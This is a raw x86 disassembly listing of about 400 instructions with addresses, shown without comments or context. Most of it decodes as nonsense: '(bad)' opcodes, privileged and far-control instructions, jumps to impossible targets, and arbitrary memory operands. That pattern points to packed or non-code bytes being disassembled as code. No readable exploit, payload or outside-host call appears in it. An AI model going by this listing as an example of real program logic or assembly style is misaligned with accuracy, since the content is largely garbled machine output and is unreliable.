  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
